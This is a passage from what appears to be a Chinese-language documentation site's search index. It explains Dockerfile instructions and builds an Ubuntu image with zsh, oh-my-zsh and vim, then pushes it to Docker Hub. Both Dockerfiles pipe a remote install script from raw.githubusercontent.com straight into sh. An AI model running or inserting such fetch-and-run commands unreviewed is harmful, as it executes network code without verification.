\u5206\u9694\u547d\u4ee4\uff0c\u4e14\u652f\u6301\u884c\u5c3e\u6dfb\u52a0<code>\\</code>\u6765\u5b9e\u73b0\u6362\u884c\u3002</p> <p>PS: \u5728\u5b66\u4e60\u5b98\u65b9\u7684 DockerFile \u4e2d\u53d1\u73b0\u4f7f\u7528\u7684<code>;</code>\u7684\u5c45\u591a\u3002</p> <p>CMD \u5bb9\u5668\u542f\u52a8\u547d\u4ee4</p> <pre><code>CMD &lt;\u547d\u4ee4&gt;\nCMD [\"\u53ef\u6267\u884c\u6587\u4ef6\", \"\u53c2\u65701\", \"\u53c2\u65702\"...] # \u63a8\u8350\u4f7f\u7528\uff0c\u6ce8\u610f\u5fc5\u987b\u662f\u53cc\u5f15\u53f7\nCMD [\"\u53c2\u65701\", \"\u53c2\u65702\"...] # \u5728\u6307\u5b9a\u4e86 ENTRYPOINT \u6307\u4ee4\u540e\uff0c\u7528 CMD \u6307\u5b9a\u5177\u4f53\u7684\u53c2\u6570\u3002\n</code></pre> <p>\u5df2\u77e5 Docker \u4e0d\u662f\u865a\u62df\u673a\uff0c\u5bb9\u5668\u5c31\u662f\u8fdb\u7a0b\u3002\u65e2\u7136\u662f\u8fdb\u7a0b\uff0c\u90a3\u4e48\u5728\u542f\u52a8\u5bb9\u5668\u7684\u65f6\u5019\uff0c\u9700\u8981\u6307\u5b9a\u6240\u8fd0\u884c\u7684\u7a0b\u5e8f\u53ca\u53c2\u6570\u3002</p> <p><code>CMD</code> \u6307\u4ee4\u5c31\u662f\u7528\u4e8e\u6307\u5b9a\u9ed8\u8ba4\u7684\u5bb9\u5668\u4e3b\u8fdb\u7a0b\u7684\u542f\u52a8\u547d\u4ee4\u7684\u3002</p> <p>ENTRYPOINT \u5165\u53e3\u70b9</p> <pre><code>ENTRYPOINT [\"/bin/zsh\"]\n</code></pre> <p>\u5982\u679c\u4e0d\u8bbe\u7f6e\u8be5\u53e5\uff0c\u5219\u4f7f\u7528\u547d\u4ee4\uff1a<code>docker run -it &lt;\u955c\u50cfid&gt;</code>\u65f6\uff0c\u9ed8\u8ba4\u4e3a bash \u8fdb\u5165\uff0c\u8bbe\u7f6e\u540e\u5219\u4e3a/bin/zsh</p> <p><code>ENTRYPOINT</code> \u7684\u76ee\u7684\u548c <code>CMD</code> \u4e00\u6837\uff0c\u90fd\u662f\u5728\u6307\u5b9a\u5bb9\u5668\u542f\u52a8\u7a0b\u5e8f\u53ca\u53c2\u6570\u3002</p> <p>\u5f53\u6307\u5b9a\u4e86 <code>ENTRYPOINT</code> \u540e\uff0c<code>CMD</code> \u7684\u542b\u4e49\u5c31\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u4e0d\u518d\u662f\u76f4\u63a5\u7684\u8fd0\u884c\u5176\u547d\u4ee4\uff0c\u800c\u662f\u5c06 <code>CMD</code> \u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9 <code>ENTRYPOINT</code> \u6307\u4ee4\uff0c\u6362\u53e5\u8bdd\u8bf4\u5b9e\u9645\u6267\u884c\u65f6\uff0c\u5c06\u53d8\u4e3a\uff1a</p> <pre><code>&lt;ENTRYPOINT&gt; \"&lt;CMD&gt;\"\n</code></pre> <p>SHELL \u6307\u5b9a shell</p> <pre><code>SHELL [\"executable\", \"parameters\"]\n</code></pre> <p><code>SHELL</code> \u6307\u4ee4\u53ef\u4ee5\u6307\u5b9a <code>RUN</code> <code>ENTRYPOINT</code> <code>CMD</code> \u6307\u4ee4\u7684 shell\uff0cLinux \u4e2d\u9ed8\u8ba4\u4e3a <code>[\"/bin/sh\", \"-c\"]</code></p> <p>Note</p> <p><code>-c</code> \u53c2\u6570\u5141\u8bb8\u5c06\u5b57\u7b26\u4e32\u5f53\u505a\u6307\u4ee4\u6267\u884c\uff1a<code>/bin/sh -c \"ls\"</code>\uff0c\u4f46 <code>/bin/sh \"ls\"</code> \u4f1a\u62a5\u9519\u3002</p> <p>COPY/ADD \u590d\u5236\u6587\u4ef6</p> <p>\u2460 COPY</p> <pre><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;\u6e90\u8def\u5f84&gt;... &lt;\u76ee\u6807\u8def\u5f84&gt;\nCOPY [--chown=&lt;user&gt;:&lt;group&gt;] [\"&lt;\u6e90\u8def\u5f841&gt;\",... \"&lt;\u76ee\u6807\u8def\u5f84&gt;\"]\n\n# example\nCOPY package.json /usr/src/app/\n</code></pre> <p>\u4e0e RUN \u7c7b\u4f3c\uff0c\u6709\u4e24\u79cd\u683c\u5f0f\u3002</p> <p>\u52a0\u4e0a <code>--chown=&lt;user&gt;:&lt;group&gt;</code> \u9009\u9879\u6765\u6539\u53d8\u6587\u4ef6\u7684\u6240\u5c5e\u7528\u6237\u53ca\u6240\u5c5e\u7ec4\u3002</p> <p>\u2461 ADD</p> <p>ADD \u7684 <code>&lt;\u6e90\u8def\u5f84&gt;</code> \u53ef\u4ee5\u662f\u4e00\u4e2a <code>URL</code>\uff0c\u6b64\u5916\uff0c\u5982\u679c <code>&lt;\u6e90\u8def\u5f84&gt;</code> \u4e3a\u4e00\u4e2a <code>tar</code> \u538b\u7f29\u6587\u4ef6\u7684\u8bdd\uff0c\u538b\u7f29\u683c\u5f0f\u4e3a <code>gzip</code>, <code>bzip2</code> \u4ee5\u53ca <code>xz</code> \u7684\u60c5\u51b5\u4e0b\uff0c<code>ADD</code> \u6307\u4ee4\u5c06\u4f1a\u81ea\u52a8\u89e3\u538b\u7f29\u8fd9\u4e2a\u538b\u7f29\u6587\u4ef6\u5230 <code>&lt;\u76ee\u6807\u8def\u5f84&gt;</code> \u53bb\u3002</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u4e0d\u5e0c\u671b\u89e3\u538b\u7f29\u7684\u8bdd\uff0c\u4e0d\u8981\u4f7f\u7528 ADD\u3002</p> <p>ENV \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf</p> <pre><code>ENV &lt;key&gt; &lt;value&gt;\nENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...\n</code></pre> <p>ENV \u8bbe\u7f6e\u7684\u73af\u5883\u53d8\u91cf\uff0c\u53ef\u5728\u540e\u7eed\u547d\u4ee4\u4e2d\u4f7f\u7528\uff0cnode \u7684\u5b98\u65b9 dockerfile\uff1a</p> <pre><code>ENV NODE_VERSION 7.2.0\nRUN curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz\"\n</code></pre> <p>VOLUME \u5b9a\u4e49\u533f\u540d\u5377</p> <p>Tip</p> <p>Dockerfile \u6700\u4f73\u5b9e\u8df5\uff1a<code>VOLUME</code> \u6307\u4ee4\u7528\u4e8e\u66b4\u9732\u4efb\u4f55\u6570\u636e\u5e93\u5b58\u50a8\u6587\u4ef6\uff0c\u914d\u7f6e\u6587\u4ef6\uff0c\u6216\u5bb9\u5668\u521b\u5efa\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u3002\u5f3a\u70c8\u5efa\u8bae\u4f7f\u7528 <code>VOLUME</code> \u6765\u7ba1\u7406\u955c\u50cf\u4e2d\u7684\u53ef\u53d8\u90e8\u5206\u548c\u7528\u6237\u53ef\u4ee5\u6539\u53d8\u7684\u90e8\u5206\u3002</p> <p>todo</p> <p>WORKDIR \u6307\u5b9a\u5de5\u4f5c\u76ee\u5f55</p> <p>\u4f7f\u7528 <code>WORKDIR</code> \u6307\u4ee4\u53ef\u4ee5\u6765\u6307\u5b9a\u5de5\u4f5c\u76ee\u5f55\uff08\u6216\u8005\u79f0\u4e3a\u5f53\u524d\u76ee\u5f55\uff09\uff0c\u4ee5\u540e\u5404\u5c42\u7684\u5f53\u524d\u76ee\u5f55\u5c31\u88ab\u6539\u4e3a\u6307\u5b9a\u7684\u76ee\u5f55\uff0c\u5982\u8be5\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c<code>WORKDIR</code> \u4f1a\u5e2e\u4f60\u5efa\u7acb\u76ee\u5f55\u3002</p> <p>\u5982\u679c\u4f60\u7684 <code>WORKDIR</code> \u6307\u4ee4\u4f7f\u7528\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\u90a3\u4e48\u6240\u5207\u6362\u7684\u8def\u5f84\u4e0e\u4e4b\u524d\u7684 <code>WORKDIR</code> \u6709\u5173\uff1a</p> <pre><code>WORKDIR /a\nWORKDIR b\nWORKDIR c\nRUN pwd\n</code></pre> <p><code>RUN pwd</code> \u7684\u5de5\u4f5c\u76ee\u5f55\u4e3a <code>/a/b/c</code>\u3002</p> <p>\u4e3a\u4e86\u6e05\u6670\u6027\u548c\u53ef\u9760\u6027\uff0c\u4f60\u5e94\u8be5\u603b\u662f\u5728 <code>WORKDIR</code> \u4e2d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u3002</p>"},{"location":"tools/docker/create-image/#ubuntu","title":"ubuntu","text":"<p>\u672c Dockerfile \u6307\u5728\u6784\u5efa\u4e00\u4e2a\u6613\u7528\u7684 ubuntu\uff1a</p> <ul> <li>\u6362\u6e90</li> <li>zsh \u53ca\u5176\u63d2\u4ef6 zsh-syntax-highlighting\u3001zsh-autosuggestions\u3001autojump</li> <li>oh-my-zsh \u53ca\u5176\u4e3b\u9898 powerlevel10k</li> <li>vim\u3001vimplus</li> <li>bat \u4ee3\u66ff cat</li> <li>\u65f6\u533a</li> </ul> <p>\u540c\u65f6\uff0c\u5b8c\u6210\u4e86\u6240\u6709\u914d\u7f6e\u6587\u4ef6\u7684\u4fee\u6539\uff0c\u662f\u4e00\u4e2a\u5f00\u7bb1\u5373\u7528\u7684 ubuntu \u955c\u50cf\u3002</p>"},{"location":"tools/docker/create-image/#_5","title":"\u4e00\u3001\u62c6\u5206\u6b65\u9aa4\u7248","text":"<p>\u62c6\u5206\u6b65\u9aa4\u7248\u4fbf\u4e8e\u8c03\u8bd5\u4f7f\u7528\uff0c\u7531\u4e8e\u7f13\u5b58\u7684\u5b58\u5728\uff0c\u53ef\u4ee5\u9ad8\u6548\u7684\u5b9a\u4f4d\u5230\u9519\u8bef\u6b65\u9aa4\u3002</p> <pre><code>FROM ubuntu:18.04\nLABEL All_rights_reserved=\"wangleqing.00@qq.com\"\n\n# \u6362\u6e90\nRUN sed -i 's/ports.ubuntu.com/mirrors.tuna.tsinghua.edu.cn/g' /etc/apt/sources.list\n\nRUN apt update -y &amp;&amp; apt upgrade -y\nRUN apt install -y sudo\nRUN apt install -y vim\nRUN apt install -y zsh\nRUN apt install -y git\nRUN apt install -y autojump\nRUN apt install -y curl\n#RUN apt install -y bat  #\u572820.04\u7248\u672c\uff0c\u901a\u8fc7apt\u5b89\u88c5\u7684bat\uff0c\u547d\u4ee4\u4e3abatcat\uff0c\u56e0\u6b64\u9700\u8981\u6dfb\u52a0alias\u3002\n\n# \u8be5\u8f6f\u4ef6\u63d0\u4f9b\u4e86\u6240\u7528 apt \u5b58\u50a8\u5e93\u7684\u62bd\u8c61\u3002\u5b83\u4f7f\u60a8\u53ef\u4ee5\u8f7b\u677e\u7ba1\u7406\u60a8\u7684\u53d1\u884c\u7248\u548c\u72ec\u7acb\u8f6f\u4ef6\u4f9b\u5e94\u5546\u8f6f\u4ef6\u6e90\u3002\nRUN apt install -y software-properties-common\n\n# OH-MY-ZSH\u3001\u63d2\u4ef6\uff1azsh-syntax-highlighting\u3001zsh-autosuggestions\u3001\u4e3b\u9898\uff1apowerlevel10k\nRUN yes|sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" \\\n    &amp;&amp; git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting \\\n    &amp;&amp; git clone git://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions \\\n    &amp;&amp; git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n\n#\u914d\u7f6e.zshrc\u6587\u4ef6\nRUN cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc\nRUN sed -i '/ZSH_THEME=\"/ c ZSH_THEME=\"powerlevel10k/powerlevel10k\"' ~/.zshrc\nRUN sed -i '/plugins=(git)/ c plugins=(git autojump zsh-syntax-highlighting zsh-autosuggestions sudo extract)' ~/.zshrc\nRUN sed -i '$a bindkey '\"'\"'`'\"'\"' autosuggest-accept' ~/.zshrc\n\n# RUN sed -i '$a alias bat=batcat' ~/.zshrc\n\n# \u8bbe\u7f6e\u65f6\u533a\nRUN export DEBIAN_FRONTEND=noninteractive &amp;&amp; apt install -y tzdata &amp;&amp; ln -fs /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n\n# \u8bbe\u7f6evim\nRUN git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime\nRUN sh ~/.vim_runtime/install_awesome_vimrc.sh\n\n# \u7cbe\u7b80\u955c\u50cf\nRUN export SUDO_FORCE_REMOVE=yes \\\n    &amp;&amp; sudo apt autoremove -y \\\n    &amp;&amp; sudo apt clean -y \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# \u8bbe\u7f6e\u5165\u53e3\nENTRYPOINT [\"/bin/zsh\"]\n</code></pre>"},{"location":"tools/docker/create-image/#_6","title":"\u4e8c\u3001\u5408\u5e76\u6b65\u9aa4\u7248","text":"<p>\u8be5\u7248\u672c\u7528\u4e8e\u6700\u7ec8\u751f\u6210\u955c\u50cf\uff0c\u53ef\u4ee5\u7cbe\u7b80\u955c\u50cf\u5927\u5c0f\u3002</p> <pre><code>FROM ubuntu:18.04\nLABEL All_rights_reserved=\"wangleqing.00@qq.com\"\nRUN set -x; buildDeps='sudo vim zsh git autojump curl tzdata' \\\n        &amp;&amp; sed -i 's/ports.ubuntu.com/mirrors.tuna.tsinghua.edu.cn/g' /etc/apt/sources.list \\\n        &amp;&amp; export DEBIAN_FRONTEND=noninteractive \\\n    &amp;&amp; export SUDO_FORCE_REMOVE=yes \\\n        &amp;&amp; apt-get update -y \\\n        &amp;&amp; apt-get upgrade -y \\\n        &amp;&amp; apt install -y software-properties-common \\\n        &amp;&amp; apt-get install -y $buildDeps \\\n        &amp;&amp; ln -fs /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\\n        &amp;&amp; yes|sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" \\\n        &amp;&amp; git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting \\\n        &amp;&amp; git clone git://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions \\\n        &amp;&amp; git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k \\\n        &amp;&amp; cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc \\\n        &amp;&amp; sed -i '/ZSH_THEME=\"/ c ZSH_THEME=\"powerlevel10k/powerlevel10k\"' ~/.zshrc \\\n        &amp;&amp; sed -i '/plugins=(git)/ c plugins=(git autojump zsh-syntax-highlighting zsh-autosuggestions sudo extract)' ~/.zshrc \\\n        &amp;&amp; sed -i '$a bindkey '\"'\"'`'\"'\"' autosuggest-accept' ~/.zshrc \\\n        #&amp;&amp; sed -i '$a alias bat=batcat' ~/.zshrc \\\n        &amp;&amp; git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime \\\n        &amp;&amp; sh ~/.vim_runtime/install_awesome_vimrc.sh \\\n        &amp;&amp; sudo apt autoremove -y \\\n        &amp;&amp; sudo apt clean -y \\\n        &amp;&amp; rm -rf /var/lib/apt/lists/*\nENTRYPOINT [\"/bin/zsh\"]\n</code></pre> <p>Tips: \u5176\u4ed6\u6700\u5c0f\u5316\u5c42\u6570\u65e0\u975e\u5c31\u662f\u628a\u6784\u5efa\u9879\u76ee\u7684\u6574\u4e2a\u6b65\u9aa4\u5f04\u6210\u4e00\u6761 RUN \u6307\u4ee4\u4e0d\u8fc7\u591a\u6761\u547d\u4ee4\u5408\u5e76\u53ef\u4ee5\u4f7f\u7528 &amp;&amp; \u6216\u8005 <code>;</code></p> <p>\u5728\u5b66\u4e60\u5b98\u65b9\u7684 DockerFile \u4e2d\u53d1\u73b0\u4f7f\u7528\u7684<code>;</code>\u7684\u5c45\u591a\u3002</p> <pre><code>RUN set -x; \\\n        buildDeps='sudo vim zsh git autojump curl tzdata' ;\\\n        sed -i 's/ports.ubuntu.com/mirrors.tuna.tsinghua.edu.cn/g' /etc/apt/sources.list ;\\\n        export DEBIAN_FRONTEND=noninteractive ;\\\n        ...\n</code></pre> <p>Dockerfile - Mysql</p> <p>\u6b64\u5916\uff0c<code>set -eux</code> \u5e38\u51fa\u73b0\u5728\u5934\u90e8\uff0c\u5176\u4f5c\u7528\u4e3a\uff1a</p> <ul> <li>-e \u3000\u82e5\u6307\u4ee4\u4f20\u56de\u503c\u4e0d\u7b49\u4e8e 0\uff0c\u5219\u7acb\u5373\u9000\u51fa shell\u3002</li> <li>-u \u3000\u5f53\u6267\u884c\u65f6\u4f7f\u7528\u5230\u672a\u5b9a\u4e49\u8fc7\u7684\u53d8\u91cf\uff0c\u5219\u663e\u793a\u9519\u8bef\u4fe1\u606f\u3002</li> <li>-x \u3000\u6267\u884c\u6307\u4ee4\u540e\uff0c\u4f1a\u5148\u663e\u793a\u8be5\u6307\u4ee4\u53ca\u6240\u4e0b\u7684\u53c2\u6570\u3002</li> </ul>"},{"location":"tools/docker/create-image/#dockerfile_1","title":"Dockerfile \u6587\u4ef6\u8bb2\u89e3","text":"<p>\u53c2\u6570\u8bf4\u660e\uff1a</p> <ul> <li><code>ln -fs</code>\uff1a\u5f3a\u5236\u6dfb\u52a0\u8f6f\u8fde\u63a5</li> <li><code>yes|./install.sh</code>\uff1a\u8fd0\u884c./install.sh \u811a\u672c\uff0c\u5e76\u4e14\u6bcf\u4e2a\u9009\u9879\u90fd\u81ea\u52a8\u9009\u62e9 yes</li> <li><code>apt install -y</code>\uff1a\u5b89\u88c5\uff0c\u5e76\u4e14\u8df3\u51fa\u7684\u9009\u9879\u9009\u62e9 yes</li> <li><code>DEBIAN_FRONTEND=\"noninteractive\"</code>\uff1a\u4fee\u6539\u5b89\u88c5\u53c2\u6570\uff0c\u4e3a\u81ea\u52a8\u5316\u5b89\u88c5\u3002\u6ce8\u610f\uff0c\u4e0d\u8981\u76f4\u63a5\u4fee\u6539 ENV\uff0c\u800c\u662f\u5728 RUN \u547d\u4ee4\u4e2d\u4e34\u65f6\u4f7f\u7528\u3002\u5f00\u542f\u8fd9\u4e2a\u540e\u5728\u5b89\u88c5 tzdata \u65f6\u624d\u4e0d\u7528\u624b\u52a8\u9009\u62e9\u3002</li> <li><code>SUDO_FORCE_REMOVE=yes</code>\uff1a\u5f3a\u5236\u5220\u9664</li> </ul> <p>\u65f6\u533a\u8bbe\u7f6e</p> <p><code>tzdata</code>\uff0c\u9ed8\u8ba4\u4e3a UTC\uff0c\u5c06\u5176\u4fee\u6539\u4e3a CST\uff0c\u53ef\u4f7f\u7528<code>date</code>\u547d\u4ee4\u67e5\u770b\uff1a</p> <ul> <li> <p>CST\uff1a\u4e2d\u56fd\u6807\u51c6\u65f6\u95f4</p> </li> <li> <p>UTC\uff1a\u4e16\u754c\u6807\u51c6\u65f6\u95f4\uff0cCST = UTC + 8</p> </li> <li>GMT\uff1a\u683c\u6797\u5c3c\u6cbb\u6807\u51c6\u65f6\u95f4</li> </ul> <p>sed\uff1a\u5229\u7528\u811a\u672c\u6307\u4ee4\u7f16\u8f91\u6587\u672c\u6587\u4ef6</p> <ul> <li><code>-i</code>\uff1a\u8868\u793a\u5e94\u7528\u4fee\u6539\uff0c\u4e0d\u52a0-i \u4e0d\u4f1a\u771f\u7684\u4fee\u6539\u6587\u4ef6</li> <li><code>c</code>\uff1a\u5339\u914d\uff08\u6216\u8005\u884c\u6570\uff09\uff0c\u5e76\u66ff\u6362</li> <li><code>$a</code>\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5339\u914d\u6700\u540e\u4e00\u884c($)\uff0c\u5e76\u4e14\u8ffd\u52a0\u5185\u5bb9(a)</li> <li>\u53c2\u8003\uff1a</li> <li>\u7b80\u5355\u6559\u7a0b-sed</li> <li>bash - \u7528 sed \u63d2\u5165\u5355\u5f15\u53f7</li> <li>sed linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c</li> </ul>"},{"location":"tools/docker/create-image/#dockerfile_2","title":"Dockerfile \u6587\u4ef6\u4f7f\u7528","text":"<p>docker build \u547d\u4ee4\u53c2\u6570</p> \u53c2\u6570 \u4f5c\u7528 -f \u6307\u5b9a\u4f7f\u7528\u7684 dockerfile \u8def\u5f84\uff0c\u9ed8\u8ba4\u4e3a\u5f53\u524d\u76ee\u5f55\u3002<code>docker build -f /path/to/Dockerfile .</code> --no-cache \u521b\u5efa\u955c\u50cf\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u4f7f\u7528\u7f13\u5b58\u3002\u5982\u679c\u6709\u7f13\u5b58\uff0c\u5728\u7b2c\u4e8c\u6b21\u751f\u6210\u955c\u50cf\u65f6\uff0c\u65e0\u9700\u91cd\u65b0\u8fdb\u884c\u4e0b\u8f7d\u7b49\u64cd\u4f5c\u3002\u9ed8\u8ba4\u6709\u7f13\u5b58 -q \u5b89\u9759\u6a21\u5f0f\uff0c\u6210\u529f\u540e\u53ea\u8f93\u51fa\u955c\u50cf ID --squash \u5c06 Dockerfile \u4e2d\u6240\u6709\u7684\u64cd\u4f5c\u538b\u7f29\u4e3a\u4e00\u5c42 -t \u955c\u50cf\u7684\u540d\u5b57\u53ca\u6807\u7b7e\uff0c\u901a\u5e38 name:tag \u6216\u8005 name \u683c\u5f0f\uff1b\u53ef\u4ee5\u5728\u4e00\u6b21\u6784\u5efa\u4e2d\u4e3a\u4e00\u4e2a\u955c\u50cf\u8bbe\u7f6e\u591a\u4e2a\u6807\u7b7e <p>\u4e00\u3001\u6784\u5efa\u955c\u50cf</p> <pre><code>#1. \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u5982\u679c\u7528\u5230ADD\u7b49\u547d\u4ee4\uff0c\u5c06\u6587\u4ef6\u653e\u5728\u8be5\u6587\u4ef6\u5939\u4e0b\nmkdir Dockerfile\n\n#2. \u521b\u5efa\u5e76\u7f16\u8f91Dockerfile\u6587\u4ef6\uff0c\u5c06\u4e0a\u8ff0\u811a\u672c\u7c98\u8d34\u5373\u53ef\nvim Dockerfile\n\n#3. \u5728Dockerfile\u6587\u4ef6\u5939\u4e0b\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6784\u5efa\u955c\u50cf\ndocker build -t ubuntu:v5 .\n\n#4. \u67e5\u770b\u955c\u50cf\ndocker images\n\n--------------------------------------------------------------------\nREPOSITORY   TAG             IMAGE ID       CREATED             SIZE\nubuntu       v4              ccc494e4188d   26 minutes ago      771MB\n--------------------------------------------------------------------\n</code></pre> <p>\u5728<code>docker build -t ubuntu:v5 .</code>\u6307\u4ee4\u7684\u672b\u5c3e\u6709\u4e00\u4e2a<code>.</code>\uff0c\u5b83\u662f\u6307\u4e0a\u4e0b\u6587\u8def\u5f84\uff0c\u6b64\u5904\u4f7f\u7528<code>.</code>\u8868\u793a\u5f53\u524d\u76ee\u5f55\u3002</p> <p>docker \u5728\u6784\u5efa\u955c\u50cf\u65f6\uff0c\u6709\u65f6\u5019\u60f3\u8981\u4f7f\u7528\u672c\u673a\u7684\u6587\u4ef6\uff08\u6bd4\u5982\u590d\u5236\uff09\uff0c\u5982\u679c\u672a\u8bf4\u660e\uff0c\u5219\u9ed8\u8ba4\u4e0a\u4e0b\u6587\u8def\u5f84\u5c31\u662f Dockerfile \u6587\u4ef6\u6240\u5728\u7684\u4f4d\u7f6e\u3002</p> <p>\u4f55\u65f6\u4f7f\u7528\u4e0a\u4e0b\u6587\u8def\u5f84\uff1aDockerfile \u4e2d\u8fd8\u5b58\u5728<code>COPY</code>\u3001<code>ADD</code>\u7b49\u6307\u4ee4\uff0c\u4f1a\u7528\u5230\u8be5\u8def\u5f84\u3002</p> <p>\u4e8c\u3001\u521b\u5efa\u5bb9\u5668</p> <pre><code>docker run -it --name \"ubuntu\" ccc494e4188d\n# \u7531\u4e8eDockerfile\u4e2d\u8bbe\u7f6e\u4e86ENTRYPOINT [\"/bin/zsh\"]\uff0c\u56e0\u6b64\u4f1a\u76f4\u63a5\u4ee5/bin/zsh\u6253\u5f00\uff0c\u5426\u5219\u4ee5/bin/bash\u6253\u5f00\u3002\n\n# ctrl + d \u9000\u51fa\u5bb9\u5668\u65f6\uff0c\u5bb9\u5668\u4f1a\u81ea\u52a8\u5173\u95ed\u3002\n\n# \u542f\u52a8\u5bb9\u5668\ndocker start ccc494e4188d\n\ndocker run -itd --name \"ubuntu\" ccc494e4188d\n# \u6b64\u65f6\u4e0d\u4f1a\u76f4\u63a5\u8fdb\u5165\u5bb9\u5668\uff0c\u5bb9\u5668\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\uff0c\u4f46\u662f\u7531\u4e8e\u53c2\u6570-d\u7684\u5b58\u5728\uff0c\u5728\u540e\u53f0\u8fd0\u884c\n# \u6ce8\u610f\uff0c\u5982\u679c\u6b64\u5904\u4e0d\u4f7f\u7528-it\uff0c\u800c\u662f\u53ea\u4f7f\u7528-d\uff0c\u5219\u5bb9\u5668\u6c38\u8fdc\u65e0\u6cd5\u542f\u52a8\u3002\n\n# \u8fdb\u5165\u5bb9\u5668\ndocker exec -it ubuntu /bin/zsh\n</code></pre> <p>\u53c2\u8003\uff1a</p> <ul> <li>Docker \u955c\u50cf\u5b89\u88c5\u914d\u7f6e zsh</li> <li>Docker\u2014\u4ece\u5165\u95e8\u5230\u5b9e\u8df5</li> </ul>"},{"location":"tools/docker/create-image/#_7","title":"\u4e0a\u4f20\u955c\u50cf","text":"<p>\u2460 \u8fdb\u5165 Docker Hub\uff0c\u6ce8\u518c\u8d26\u53f7(docker id\uff1ahappytsing)</p> <p>\u2461 \u7ed9\u955c\u50cf\u6253\u6807\u7b7e</p> <pre><code>docker images\n\n------------------------------------------------------------------------\nREPOSITORY          TAG             IMAGE ID       CREATED        SIZE\nubuntu              v5              01187e1edca1   15 hours ago   771MB\n------------------------------------------------------------------------\n\ndocker tag ubuntu:v1 happytsing/ubuntu:20.04c\n\n------------------------------------------------------------------------\nREPOSITORY          TAG             IMAGE ID       CREATED        SIZE\nhappytsing/ubuntu   20.04c          01187e1edca1   15 hours ago   771MB\n------------------------------------------------------------------------\n</code></pre> <p>\u2462 \u4e0a\u4f20\u955c\u50cf</p> <pre><code>docker push happytsing/ubuntu:20.04c\n</code></pre> <p>\u4e0a\u8ff0\u955c\u50cf\u5df2\u7ecf\u4e0a\u4f20\uff0c\u6709\u9700\u8981\u53ef\u4ee5\u81ea\u53d6\uff1a</p> <pre><code>docker pull happytsing/ubuntu:20.04c\n</code></pre>"},{"location":"tools/docker/install/","title":"Docker \u7b80\u4ecb\u53ca\u5b89\u88c5","text":""},{"location":"tools/docker/install/#_1","title":"\u5bb9\u5668\u4e0e\u865a\u62df\u673a","text":"<p>\u4e00\u3001\u4ec0\u4e48\u662f Docker</p> <p>Docker \u662f\u4e16\u754c\u9886\u5148\u7684\u8f6f\u4ef6 \u5bb9\u5668 \u5e73\u53f0</p> <p>\u5bb9\u5668\uff1a\u5bb9\u5668\u5c31\u662f\u5c06\u8f6f\u4ef6\u6253\u5305\u6210\u6807\u51c6\u5316\u5355\u5143\uff0c\u4ee5\u7528\u4e8e\u5f00\u53d1\u3001\u4ea4\u4ed8\u548c\u90e8\u7f72\u3002</p> <p>\u5f53\u4f7f\u7528\u5bb9\u5668\u6765\u6253\u5305\u5e94\u7528\u3001\u89e3\u8026\u5e94\u7528\u548c\u8fd0\u884c\u5e73\u53f0\uff0c\u610f\u5473\u7740\u8fc1\u79fb\u7684\u65f6\u5019\uff0c\u53ea\u9700\u8981\u5728\u65b0\u7684\u670d\u52a1\u5668\u4e0a\u542f\u52a8\u6240\u9700\u8981\u7684\u5bb9\u5668\u5373\u53ef\uff0c\u65e0\u8bba\u65b0\u65e7\u670d\u52a1\u5668\u662f\u5426\u662f\u540c\u4e00\u7c7b\u578b\u7684\u5e73\u53f0\uff0c\u90fd\u4e0d\u4f1a\u51fa\u9519\uff0c\u5373 Docker \u5bb9\u5668\u662f\u5bf9\u8fdb\u7a0b\u8fdb\u884c\u5c01\u88c5\u9694\u79bb\uff0c\u5c5e\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u5c42\u9762\u7684\u865a\u62df\u5316\u6280\u672f\u3002</p> <p>\u4e8c\u3001\u5bb9\u5668\u4e0e\u865a\u62df\u673a</p> <p>\u5bb9\u5668\u548c\u865a\u62df\u673a\u5177\u6709\u76f8\u4f3c\u7684\u8d44\u6e90\u9694\u79bb\u548c\u5206\u914d\u4f18\u52bf\uff0c\u4f46\u529f\u80fd\u6709\u6240\u4e0d\u540c\uff0c\u56e0\u4e3a \u5bb9\u5668\u865a\u62df\u5316\u7684\u662f\u64cd\u4f5c\u7cfb\u7edf\uff0c\u800c 